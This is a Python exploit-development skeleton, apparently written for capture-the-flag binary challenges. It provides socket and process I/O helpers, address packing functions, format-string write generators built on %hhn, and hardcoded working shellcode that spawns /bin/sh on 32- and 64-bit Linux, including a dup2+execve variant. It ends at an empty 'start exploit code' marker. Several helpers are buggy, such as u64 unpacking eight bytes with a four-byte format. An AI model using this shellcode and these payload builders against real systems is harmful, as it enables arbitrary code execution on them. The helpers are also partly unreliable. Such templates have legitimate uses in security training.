#!/usr/bin/python
# -*- coding: utf-8 -*-

import __main__, os, sys, struct, socket, telnetlib, subprocess, time
from libformatstr import FormatStr
import sys, re, binascii

home = os.environ['HOME']
mgtoolslib = home + "/mgtools/lib/python"
pedalib = home + "/peda/lib"
if not(os.path.exists(pedalib)):
    print("[+]Error\nTry: mpinstall")
sys.path.append(mgtoolslib)
sys.path.append(pedalib)

import shlex
import string
import signal
import traceback
import codecs
import six
from six.moves import range
from six.moves import input
import six.moves.cPickle as pickle
import pickle
from skeleton import *
from shellcode import *
from utils import *
import config
from nasm import *

proc = ''
s = ''
 
def local(cmd):
    __main__.proc = subprocess.Popen(cmd.strip().split(' '))
    proc.wait()

def pipelocal(cmd):
    __main__.proc = subprocess.Popen(cmd.strip().split(' '), stdin=subprocess.PIPE, stdout=subprocess.PIPE)

# socat tcp-listen:4444,reuseaddr,fork exec:./a.out
def sock(remoteip="127.0.0.1", remoteport=4444):
    __main__.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    time.sleep(0.5)

def splitn(data, n):
    length = len(data)
    return [data[i:i+n] for i in range(0, length, n)]

def writefile(buf_arg,file_name):
    with open(file_name, 'wb') as f:
        f.write(buf_arg)

def recv(delim='\n', out=1):
    data = ''
    while not data.endswith(delim):
        data += s.recv(1)
    if(out == 1):
        print('\nrecv: \n' + data + '\n')
    return data

def recvn(x=1024, out=1):
    data = ''
    data += s.recv(x)
    if(out == 1):
        print('\nrecv: \n' + data + '\n')
    return data

def send(x, sleep=0.3, out=1):
    s.sendall(x + '\n')
    if(out == 1):
        print('\nsend: \n' + x + '\n')
    time.sleep(sleep)

def u(x):
    return struct.unpack("<I",x[:4])[0]

def u64(x):
    return struct.unpack("<I",x[:8])[0]

def p(x):
    return struct.pack("<I",x)

def p64(x):
    return struct.pack("<Q",x)

def shell():
    if(s != ''):
        print('---- interactive mode ----')
        t= telnetlib.Telnet()
        t.sock = s
        t.interact()
    elif(p != ''):
        print('---- interactive mode ----')
        proc.wait()

#katagaitai_command_start
#def xxd(a):
#    hexdump.hexdump(a)
#
#def dbg(ss):
#    print "[+] %s: 0x%x"%(ss, eval(ss))
#
#def countdown(n):
#    for i in xrange(n,0,-1):
#        print str(i) + "..",
#        sys.stdout.flush()
#        time.sleep(1)
#    print
#katagaitai_command_end

def read(delim="\n", out=1):
    data = ''
    while not data.endswith(delim):
        data += proc.stdout.readlne(1)
    if(out == 1):
        print('\nread: \n' + data + '\n')
    return data

def readn(num=1024, out=1):
    data = ''
    while(num>0):
        data += proc.stdout.read(1)
        num = num-1
    if(out == 1):
        print('\nread: \n' + data + '\n')
    return data
 
def fsa1(recent_len, index_start, after_data):
    data = '%' + \
            str( ((after_data-int(hex(recent_len)[:4],16)-1)%0x100)+1 ) + \
            'c%' + str(index_start) + '$hhn'
    return data

def fsa4(recent_len, index_start, after_addr):
    a = map(ord,p(after_addr))
    b = map(ord,p(after_addr))
    a[3] = ((a[3]-a[2]-1) % 0x100) + 1
    a[2] = ((a[2]-a[1]-1) % 0x100) + 1
    a[1] = ((a[1]-a[0]-1) % 0x100) + 1
    a[0] = ((a[0]-int(hex(recent_len)[:4],16)-1) % 0x100) + 1
    data = ''
    data += '%{0}c'.format(str(a[0])) + \
            '%' + str(index_start+0) + '$hhn'
    data += '%{0}c'.format(str(a[1])) + \
            '%' + str(index_start+1) + '$hhn'
    data += '%{0}c'.format(str(a[2])) + \
            '%' + str(index_start+2) + '$hhn'
    data += '%{0}c'.format(str(a[3])) + \
            '%' + str(index_start+3) + '$hhn'
    return data

def writefile(buf_arg,file_name):
    with open(file_name, 'wb') as f:
        f.write(buf_arg)

def addr2index(x):
    return x*2

def index2addr(x):
    return x/2

def ascii2addr(x):
    addr1 = str(x)[0:2]
    addr2 = str(x)[2:4]
    addr3 = str(x)[4:6]
    addr4 = str(x)[6:8]
    return int(addr4 + addr3 + addr2 + addr1, 16)

def splitn(data, n):
    length = len(data)
    return [data[i:i+n] for i in range(0, length, n)]

def xxd(a):
    a = str(a)
    hexdump.hexdump(a)

def dmp(binary, fmt="def"):
    res = binascii.hexlify(binary)
    if(fmt == "x"):
        arr = splitn(res, 8)
        res = []
        for var in arr:
            res.append(hex(ascii2addr(var)))
    if(fmt == "d"):
        arr = splitn(res, 8)
        res = []
        for var in arr:
            res.append(ascii2addr(var))
    return res

def s12(value):
    res = []
    for item in value.split(" "):
        res.append(bin(int(item,16))[2:])
    return -(int(res[0].zfill(4)+res[1].zfill(8),2) & 0b100000000000) | (int(res[0].zfill(4)+res[1].zfill(8),2)& 0b011111111111)

sc_execve32 = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
sc_execve64 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
sc_dup2execve32 = "\x31\xd2\x31\xc9\x8d\x5a\x04\x8d\x42\x3f\xcd\x80\x41\x8d\x42\x3f\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
"""
        /* sc_dup2execve32 */
        .intel_syntax noprefix
        .globl _start
_start:
        /* dup2(2, 0) */
        xor edx, edx
        xor ecx, ecx
        lea ebx, [edx+4] //fd 4
        lea eax, [edx+63]
        int 0x80
        /* dup2(2, 1) */
        inc ecx
        lea eax, [edx+63]
        int 0x80
        /* execve("/bin//sh", {"/bin//sh", NULL}, NULL) */
        xor edx, edx
        push edx
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push edx
        push ebx
        mov ecx, esp
        lea eax, [edx+11]
        int 0x80
"""
#-----------START EXPLOIT CODE-----------#

